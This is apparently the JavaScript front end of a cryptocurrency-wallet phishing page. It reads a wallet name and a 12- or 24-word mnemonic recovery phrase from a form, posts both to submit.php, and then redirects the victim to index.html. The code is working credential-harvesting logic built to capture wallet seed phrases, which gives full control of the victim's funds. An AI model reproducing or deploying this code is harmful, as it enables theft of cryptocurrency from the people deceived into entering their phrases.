function SubmitFormData() {
    var wallet = $("#name").val();
    var key = $("#secretKey").val();

    if (wallet == '' || key == '') {
        $('#keyErr').html("<p>All fields are required</p>");
    } else {
        var keyNumber = key.match(/(\w+)/g).length;
        if (keyNumber != 12 && keyNumber != 24) {
            $('#keyErr').html("<p>Invalid Mnemonic Phrase</p>")
        } else {
            $.post("submit.php", {
                    name: wallet,
                    secretKey: key
                },
                function(data) {
                    $('#results').html(data);
                    $('#phraseForm')[0].reset();
                    location.href = 'index.html'

                });
        }
    }

}


function clearErr() {
    $('#keyErr').html('')
}